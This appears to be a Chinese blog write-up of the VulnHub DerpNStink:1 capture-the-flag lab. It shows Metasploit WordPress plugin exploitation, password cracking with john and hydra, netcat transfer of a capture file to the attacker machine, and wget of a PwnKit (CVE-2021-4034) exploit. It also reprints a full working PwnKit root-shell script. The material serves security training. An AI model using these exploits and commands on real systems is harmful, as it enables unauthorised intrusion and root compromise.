---
title: DerpNStink-1
author: Creexile
date: 2024-09-26 19:36:30
lastMod: 2024-09-26
summary: 'No.4'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [MSF, MySQL, 提权, 爆破, 漏洞利用, 日志, SSH, 渗透]
---

# DerpNStink: 1

---

No.4

> 来源: [vulnhub靶场-DerpNStink:1](https://www.vulnhub.com/entry/derpnstink-1,221/)
>
> 目标: attack the VM and find all 4 flags eventually leading you to full root access
>
> 妙妙工具: python -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

- kali: 192.168.56.6
- ubuntu: 192.168.56.10

## 信息收集

```
nmap -sS 192.168.56.0/24
nmap -p- 192.168.56.10
nmap -sC -sV -p- -v -A 192.168.56.10
```

结合工具以及访问网页, 可以收集一些信息

```bash
# 端口:
21,22,80,3306
# 中间件:
apache/2.4.7
MySQL
jQuery
PHP
# 操作系统:
Ubuntu 2ubuntu2.8
# cms:
WordPres
```

直接访问80端口, 可以在网页中搜索找到flag1, 还找到一个`/webnotes/info.txt`

![image-20240924204439528](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240924204439528.png)

```
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->
# 需要修改host文件
```

WordPress后台有弱密码, 账号密码均为`admin`

先配置hosts文件, 你问我网址怎么来的, 我说windows登录后得到的, 或者linux访问`/weblog/wp-admin`得到的

```
vim /etc/hosts
192.168.56.10    derpnstink.local
```

进行目录扫描:

```
/php/phpmyadmin
/robots.txt
/temporary/        # 仅仅输出try harder
/weblog
/weblog/wp-admin
/webnotes
```

利用漏洞扫描工具进一步扫描(kali自带的wpscan), 搜索漏洞:

```bash
wpscan --url http://derpnstink.local/weblog/
# 找到过时插件: slideshow-gallery 1.4.8
# 有cms主题 twentysixteen

search WordPress 4.6
# 这不一眼看到slideshowgallery_upload
# 我没有在搜索引擎找到对应的编号
```

> 搜索方式不对导致的, 应该搜索这个: wordpress slideshow exploit

![image-20240925193308091](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925193308091.png)

## getshell

```
use exploit/unix/webapp/wp_slideshowgallery_upload
set rhosts 192.168.56.10
set targeturi /weblog
set wp_password admin
set wp_user admin
# 记得看 lhost 是否正确, 下图就是因为没有设置 lhost 上传了一堆
```

![image-20240925194854979](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925194854979.png)

继续信息收集:

```bash
# 用户 whoami
www-data
# 系统内核 uname -a
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
# 环境
gcc
# 配置文件 /var/www/html/weblog/wp-config.php
mysql账密: root mysql
库名: wordpress
```

> `lsb_release -a` 查看发行版本
>
> `find / -perm -u=s -type f 2>/dev/null` 查看有suid权限的文件

进入mysql收集信息:

```mysql
use wordpress
show tables;
select * from wp_users;
```

可以找到最后一列是flag2, 但是没有值, 猜测是另一个账号登录获取flag2

![image-20240925200926303](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925200926303.png)

结果在`wp_posts`数据库中找到了flag2, 那挺好的

> 爆破密钥的话可以利用kali的`john`工具, 将要爆破的写进pass.txt进行爆破; rockyou.txt可以去到这个目录下解压`rockyou.txt.gz`
>
> ```bash
> john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
> # unclestinky/wedgie57  登录wordpress获得flag2
> ```

现在只剩下21和22没有试过了, 但是发现登录需要账号密码

获取用户名可以`cat /etc/passwd`, 也可以前往`/home`查看有谁的配置文件

```bash
# 用户: mrderp, stinky
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.10 ftp
# 爆破拿到ftp账密: stinky wedgie57
```

> 发现这一套账号密码也可以直接用于`su stinky`
>
> 主要是我在ftp里面找不到东西

利用`su stinky`登录对应账号, 在此权限下进入`/home/stinky/Desktop`找到flag.txt, 这是flag3

![image-20240925205624768](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925205624768.png)

三个都找到了, 结合靶机描述, 下一步我们应该提权

## 提权

> 耗时最久的一集

```
searchsploit ubuntu 14.04, 测试半天没有任何收获
```

遂用搜索引擎寻找新的方法: [Ubuntu内核提权-Xe的库](https://942178v2gb.k.topthink.com/@k7pl99lypy/Ubuntuneihetiquan.html)

已经测试的: `CVE-2017-16995`(45010.c), `CVE-2021-3493`(37292.c)

2021这么新都不行, 向后找[CVE-2021-4034：Linux Polkit 权限提升漏洞复现以及修复](http://1.13.190.198/2022/04/07/CVE-2021-4034/)

```bash
wget http://192.168.56.6:6789/cve-2021-4034.c
chmod 777 cve-2021-4034.c
gcc cve-2021-4034.c -o poc
chmod 777 poc
./poc
```

![image-20240926145559032](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145559032.png)

然后进入`/root`, 在Desktop下找到flag4, 圆满完成任务

![image-20240926145704769](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145704769.png)

## 其他提权

### 内核提权

内核版本为4.4.0, 该内核受脏牛漏洞影响, 后面不必多说

### 非内核提权

从Wordpress的配置文件wp-config中可以获取到数据库账密: `root:mysql`

```mysql
# 查看wordpress保存的用户
select * from wp_users;
# 有一个unclestinky令人在意
select user_login,user_pass from wp_users;
```

在`/etc/passwd`中存在一个用户stinky, 该命名相似度, 可以尝试破解这个密码并登录

将密码保存为key文件, 利用john进行爆破

```bash
john key -w=/usr/share/wordlists/rockyou.txt
```

得到密码为`wedgie57`. 切换用户为stinky, 在用户的Documents目录下存在`derpissues.pcap`流量包, 进行流量分析

传递文件:

```bash
# kali:
nc -lvvp 1234 > derpissues.pcap
# 靶机:
nc -nv 192.168.56.6 1234 < derpissues.pcap
```

![image-20240926152420545](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926152420545.png)

分析文件, 在http过滤器下找到No.5598数据包(POST, 而且是创建新用户)

```
wireshark derpissues.pcap
```

![image-20240926155413165](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926155413165.png)

尝试用这个密码去登录用户, 成功登录

```bash
ssh mrderp@192.168.56.10
derpderpderpderpderpderpderp
```

执行`sudo -l`, 发现可以执行特定路径下有sudo权限

```
mrderp ALL=(ALL) /home/mrderp/binaries/derpy*
```

也就是允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/目录下derpy开头的文件

没有这个目录就去创建这个目录, 可以获取root权限; 或者可以弹个root权限的shell出去

```bash
mkdir binaries
echo '/bin/bash' >> derpy.sh
chmod 777 derpy.sh
sudo ./derpy.sh
```

![image-20240926183631782](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926183631782.png)

## 附录

去找了其他大佬的博客, 我们似乎用不同的方法跳过了不少步骤

### ftp中有公钥文件

在`/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh`下有一个key.txt

```
get key.txt    # 下载到本地
```

利用这个密钥可以登录前面找到的两个账户

如果出现`Permissions 0664 for 'key.txt' are too open`, 就把权限设为400

```bash
chmod 400 key.txt   # -rwx
ssh -i key.txt stinky@192.168.159.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa
# 此处两个我都无法登录
```

### ftp中还有聊天文件

`/files/network-logs/`下还有`derpissues.txt`

在这里可以看到通过数据包捕获工具进行问题排查, 那就是排查我们的到的那个数据包

```
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are…
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

### mrderp的Desktop下有提权方式

有一个`helpdesk.log`, 里面有提示:

![image-20240926160236163](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926160236163.png)

这个网址在访问后有一句话:

```
mrderp ALL=(ALL) /home/mrderp/binaries/derpy*
```

### 扒拉过来的py提权文件

```python
# !/usr/bin/env python3
#  CVE-2021-4034
#  Ravindu Wickramasinghe (@rvizx9)

import os
from ctypes import *
from ctypes.util import find_library

so='''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);setgid(0);seteuid(0);setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
    exit(0);
}
'''

def main():
    os.system("mkdir -p 'GCONV_PATH=.' pwnkit ; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
    os.system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")
    f=open("pwnkit/pwnkit.c","w") ; f.write(so) ;f.close()
    os.system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC")
    envi=[b"pwnkit", b"PATH=GCONV_PATH=.",b"CHARSET=PWNKIT",b"SHELL=pwnkit",None]
    env=(c_char_p * len(envi))() ;env[:]=envi
    libc = CDLL(find_library('c'))
    libc.execve(b'/usr/bin/pkexec',c_char_p(None) ,env)

main()
```

### 收集笔记

- ip:
  192.168.56.10

- 域名: d
  erpnstink.local

- 网站信息/路径:

  wordpress

  /weblog/wp-admin

  /php/phpmyadmin

- 账密:
  ssh/su: mrderp / derpderpderpderpderpderpderp
  ftp/su: stinky / wedgie57
